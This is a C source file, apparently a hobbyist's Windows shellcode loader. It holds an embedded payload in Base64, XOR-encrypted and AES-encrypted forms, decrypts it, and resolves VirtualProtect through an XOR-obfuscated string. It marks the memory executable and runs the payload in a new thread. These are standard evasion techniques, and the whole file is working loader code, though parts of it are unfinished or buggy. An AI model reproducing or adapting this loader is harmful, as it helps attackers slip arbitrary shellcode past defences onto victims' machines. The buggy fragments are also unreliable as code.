/**
    This is the exe that I will be able to use to call
    my dll
    **/

#include <windows.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
//Only needed for AES
#include <psapi.h> 
 // Needed only for AES
#pragma comment (lib,"advapi32")
// Only extra needed for 64, also needed for AES

#pragma comment (lib, "Crypt32.lib") 



// Base64 length 260
// xor length 835
// AES length 209
#define B64_payload_len_val 260
#define XOR_payload_len_val 835
#define AES_payload_len_val 209
#define debug 1


#define bytePassword_Length_val 16
#define operation_mode 2

char  charPassword_val[] = "password";
char  bytePassword_val[] =  {0x3a, 0x8c, 0x3e, 0x80, 0x6, 0x8c, 0xdd, 0x89, 0xa6, 0x46, 0xf, 0x61, 0x7, 0xc8, 0x64, 0xd1};

BOOL ( WINAPI * pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
   PDWORD lpflOldProtect
);









unsigned char B64_encoded_payload[] = 
    "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQH"
    "H4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw"
    "0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYV"
    "laUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ"
    "8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";
unsigned char XOR_encrypted_payload[] = {
    0x8c, 0x89, 0xf1, 0x73, 0x77, 0x6f, 0x12, 0xed, 
    0x95, 0x50, 0xb3, 0x17, 0xfc, 0x3f, 0x42, 0xef,
    0x22, 0x6d, 0xf8, 0x21, 0x63, 0xe4, 0x0, 0x4c, 
    0x7f, 0xd6, 0x39, 0x55, 0x46, 0x90, 0xde, 0x58, 
    0x11, 0x1d, 0x71, 0x5f, 0x57, 0xae, 0xbd, 0x69, 
    0x71, 0xa6, 0x91, 0x81, 0x25, 0x38, 0xf9, 0x36, 
    0x60, 0xea, 0x39, 0x4f, 0xfc, 0x23, 0x63, 0x1c, 
    0x93, 0x29, 0x72, 0xa2, 0x26, 0xe4, 0x2b, 0x44, 
    0x71, 0xb2, 0xf8, 0x3a, 0x6f, 0x8c, 0x48, 0x2d, 
    0xfb, 0x55, 0xf8, 0x72, 0xa1, 0x5e, 0x8d, 0xc8, 
    0xb1, 0xae, 0x7e, 0x72, 0xb0, 0x57, 0x92, 0x11, 
    0x86, 0x62, 0xe, 0x8b, 0x4c, 0x12, 0x56, 0x11, 
    0x94, 0x39, 0xf8, 0x2b, 0x53, 0x6e, 0xa1, 0x2, 
    0xfb, 0x6d, 0x38, 0xf8, 0x2f, 0x73, 0x73, 0xb7, 
    0xfb, 0x65, 0xf8, 0x72, 0xa7, 0xe6, 0x36, 0x40, 
    0x54, 0x3a, 0x28, 0x12, 0x2e, 0x35, 0x23, 0x9b, 
    0x90, 0x3e, 0x2c, 0x29, 0xfc, 0x7d, 0x99, 0xe9, 
    0x2d, 0xb, 0x72, 0xfe, 0xf2, 0xdd, 0x72, 0x64, 
    0x70, 0x31, 0x1b, 0x42, 0xfc, 0x0, 0xf5, 0x9b, 
    0xa5, 0xda, 0x83, 0xc6, 0xd5, 0x39, 0x1a, 0xc2, 
    0xe5, 0xdc, 0xee, 0x8c, 0xa2, 0x53, 0x74, 0x18, 
    0x7a, 0xe1, 0x88, 0x93, 0x2, 0x6a, 0xc9, 0x23, 
    0x63, 0x13, 0x1c, 0x19, 0x77, 0x3c, 0x8d, 0xb1, 
    0x13, 0x0, 0x1f, 0x10, 0x59, 0xa, 0xa, 0x1, 0x70};



unsigned char AES_encrypted_payload[] = 
    {0x94, 0xfd, 0xf9, 0x1d, 0x6d, 0xbd, 0xbf, 0xf8, 
    0xb1, 0x78, 0x55, 0x2f, 0xc7, 0x4c, 0xc, 0xc4, 0xb4, 
    0xc8, 0xc9, 0x7a, 0x14, 0xdc, 0x54, 0x7d, 0x12, 0xed, 
    0x6c, 0x5b, 0xc9, 0xd6, 0xd3, 0x95, 0xaa, 0x68, 0x6a, 
    0x43, 0xb7, 0xb4, 0xf7, 0xfc, 0x8c, 0xe7, 0xe1, 0x3c, 
    0x89, 0xe5, 0x4c, 0xb9, 0xd9, 0x2e, 0x73, 0xf9, 0x28, 
    0x3e, 0x78, 0x40, 0x2c, 0xc4, 0xbd, 0x8d, 0x24, 0xed, 
    0xe0, 0x2e, 0xdb, 0x5c, 0x2e, 0x7d, 0xd5, 0xcb, 0x71, 
    0xf0, 0xaa, 0xb8, 0x35, 0x5a, 0xba, 0x86, 0x3a, 0x21, 
    0x87, 0x86, 0xff, 0xb6, 0x8f, 0xcf, 0x9d, 0x6c, 0x94, 
    0xb7, 0x9d, 0x29, 0x91, 0x8d, 0x32, 0xe2, 0xdc, 0xc2, 
    0xe0, 0x52, 0x42, 0xaf, 0xb8, 0xf6, 0x73, 0x70, 0x7, 
    0xb8, 0x2b, 0xc4, 0x99, 0x40, 0xd, 0x65, 0x6c, 0xc9, 
    0x69, 0x35, 0x4a, 0x6, 0x33, 0x93, 0x92, 0xfb, 0xec, 
    0x8b, 0xd, 0x7f, 0x5, 0x3d, 0x6d, 0xfc, 0x24, 0x6f, 
    0x86, 0xc2, 0x2b, 0xf0, 0xdb, 0x9, 0x33, 0x92, 0xc8, 
    0xd7, 0xb3, 0x82, 0x41, 0x4a, 0xb2, 0xe, 0xa, 0x31, 
    0x57, 0x98, 0x57, 0x56, 0x5e, 0x97, 0x9d, 0x89, 0xc3, 
    0x5f, 0x0, 0x73, 0x86, 0xa7, 0x8, 0xce, 0x61, 0x95, 
    0xb8, 0x84, 0xc8, 0x5b, 0xaa, 0x27, 0x68, 0x1d, 0x39, 
    0x66, 0xfa, 0x15, 0x54, 0xd6, 0xce, 0xf8, 0x8e, 0x86, 
    0x27, 0xef, 0xa8, 0x22, 0xf4, 0xb5, 0x50, 0x30, 0xc1, 
    0xa4, 0x96, 0xd6, 0x91, 0x10, 0x62, 0x82, 0xfd, 0xbc, 
    0x90, 0x23, 0xb7};
//


/**
    Debugging tool that dumps out the size or max in hex
/*/
int rawDump(char * location, int size, unsigned int max){
    unsigned int i =0;
    while (i < size)
    {
        if( i % 10 == 0) if (debug) printf("\n");
        if (debug) printf("%02hhx ", location[i]);
        i++;
        if(i > max) return 0;
    }      
    return 0;
}



//Storing the payload as a global changes where it is stored
// in the executable into the data section



/**
    Function that sets the payload and payload length based on the mode
*/
int getPayload(char ** payload, int * payload_len, int mode){

    switch(mode)  {
        case 1:

            *payload = B64_encoded_payload;
            *payload_len = B64_payload_len_val;

        break;

        case 2:
            *payload = XOR_encrypted_payload;
            *payload_len = XOR_payload_len_val;

        break;


        case 3:
            *payload = AES_encrypted_payload;
            *payload_len = AES_payload_len_val;

        break;




    }

    return 1;

}



/**
    Function to return the key depending on the mode
*/
int getKey(int * key_len, char ** key, int mode){

    //The byte value hasto be assigned at initilisation because it is an 
    // array of bytes not a string I can change the pointer to
    char * tmp_key = bytePassword_val;
    if (mode == 3) {
        *key_len = bytePassword_Length_val;

    } else{
        tmp_key = charPassword_val;
        *key_len = strlen(charPassword_val);
    }
    // if (debug) printf("key length: %d\n", *key_len);

    *key = malloc( sizeof(char) * ( *key_len ) );
    memcpy(*key, tmp_key, *key_len);

    // if (debug) printf("base key: ", *key);
    // rawDump(*key, *key_len, *key_len);
    // if (debug) printf("\nThe given value: %s\nThe tmp value (should be the same) %s\n", charPassword_val, tmp_key);
    // if (debug) printf("\nreturn key: %s\nat: %p\n", *key, (void *) key);

    return 0;


}

/**
    Function that takes the encrypted payload and decrypts
    it and places it in the payload parameter
*/
int decode(char * payload, char * encrypted_payload, 
            int * payload_len, char * key, int key_length,  int mode){


    switch(mode)  {
        
        //Base64 decoding
        case 1:
            if (debug) puts("decoding the B64 Payload\n");

            // DecodeBase64((const BYTE *) encrypted_payload, payload_len, 
            //     (char *) payload, payload_len);

            // Not sure where I got this
            
            DWORD   outLen;
            BOOL fRet;
            outLen = //TODO

            fRet = CryptStringToBinary( (LPCSTR) encrypted_payload,
                payload_len, CRYPT_STRING_BASE64, (BYTE *)payload,
                 &outLen, NULL, NULL);

            //failed run
            if(!fRet)
                return 0;
            
            return outLen;





        break;

        // XOR decryption
        case 2:

            if (debug) puts("Decrytping the XOR payload\n");

            int i;
            int j = 0;

            if (debug) printf("Key: %s\nData: %x", key, encrypted_payload);

            //TODO would this be a <= because 
            // this is raw data and not char with a null byte
            for (i = 0; i < payload_len; i++){
                payload[i] = encrypted_payload[i] ^ key[j];
                j = (j +1) % key_length;
            }



        break;


        //AES Decryption
        case 3:

            //AES decrypts the string into itself so copy the 
            // encrypted one to the output

            if (debug) puts("decrypting AES payload now\n");

            memcpy(payload, encrypted_payload, payload_len);

            HCRYPTPROV hProv;
            HCRYPTHASH hHash;
            HCRYPTKEY hKey;

            if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ if (debug) puts("fail 1"); return 1;}
            if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)                         ){ if (debug) puts("fail 2"); return 1;}
            if (!CryptHashData(hHash, (BYTE*)key, (DWORD) key_length, 0)                    ){ if (debug) puts("fail 3"); return 1;}
            if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)                       ){ if (debug) puts("fail 4"); return 1;}


            if (debug) printf("\n\npayload before: \n");
            rawDump(payload, payload_len, 20);





            if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0,0, payload, &payload_len))         { if (debug) puts("\nfail 5\n"); }




            if (debug) printf("last error %x", GetLastError());
            
            if (debug) printf("\n\npayload after: \n");
            rawDump(payload, payload_len, 20);

            CryptReleaseContext(hProv, 0);
            CryptDestroyHash(hHash);
            CryptDestroyKey(hKey);



        break;





    }

    if (debug) puts("\npayload is in plaintext now\n");

    return 1;



    
}


int main(void) {



    //Get the virtual protect string to call as a function handler
    char string_key[] = "181X1x1";
    char virtualprotect_string_enc[] = 
    {0x67, 0x51, 0x43, 0x2c, 0x44, 0x19, 0x5d, 0x61, 0x4a, 0x5e, 0x2c, 0x54, 0x1b, 0x45};
    char * virtualprotect_string = malloc(sizeof(char) * sizeof(virtualprotect_string_enc) +1);
    decode(virtualprotect_string, virtualprotect_string_enc, sizeof(virtualprotect_string_enc),
            string_key, sizeof(string_key)-1, 2);

    //virtualprotect_string[sizeof(virtualprotect_string)-1] = 0;

    if (decode) printf("%s", virtualprotect_string);

    rawDump(virtualprotect_string, sizeof(virtualprotect_string_enc) + 1, sizeof(virtualprotect_string_enc) + 1);
    //rawDump("VirtualProtect", sizeof("VirtualProtect"), sizeof("VirtualProtect"));


    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), virtualprotect_string);




    printf("\n\nhere I come, mode %d\n\n",operation_mode);

    getchar();

    
    char * encrypted_payload;
    int payload_len;
    void * payload_mem;
    BOOL succseful_mem_change;
    HANDLE thread;
    DWORD oldprotect = 0;
    int key_length;
    char * key;
    int i = 0;

    if (debug) puts("get key\n");


    getKey(&key_length, &key, operation_mode);
    
    
    
    
    if (debug) printf("Size of key: %d\n", key_length);
    if (debug) printf("given key: %s\nat: %p\nraw key: ", key, (void *) key);
    rawDump(key, key_length, key_length);
    if (debug) puts("\n");




    if (debug) puts("get payload\n");
    
    //Get the payload dependant on the mode
    getPayload(&encrypted_payload, &payload_len,  operation_mode);
    
    //Create an area to place the decrypted payload
    char * payload = malloc(payload_len * sizeof(char));

    if (debug) puts("\n\nget payload from:\n");
    rawDump(encrypted_payload, payload_len, 10);
    decode(payload, encrypted_payload, payload_len, 
        key, key_length, operation_mode);
    
    if (debug) puts("\n\nreturned payload:\n");
    rawDump(payload, payload_len, 10);

    if (debug) puts("\n");







    //Create a memory area we can controle the permisions of
    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | 
        MEM_RESERVE, PAGE_READWRITE);

    //not sure why I methiod: succseful_mem_change
    
    //copy the payload to the memory
    RtlMoveMemory(payload_mem, payload, payload_len);
    
    if (debug) printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    if (debug) printf("%-20s : 0x%-016p\n", "payload mem addr", (void *)payload_mem);


    //Change the memory to read exicutable in order to run the payload
    succseful_mem_change = pVirtualProtect(payload_mem, payload_len, 
        PAGE_EXECUTE_READ, &oldprotect);

    if (debug) printf("\n ready to rock and roll\n");


    if ( succseful_mem_change ) {
        thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
        WaitForSingleObject(thread, -1); 
    }


    if (debug) printf("payload done");



    return 0;

}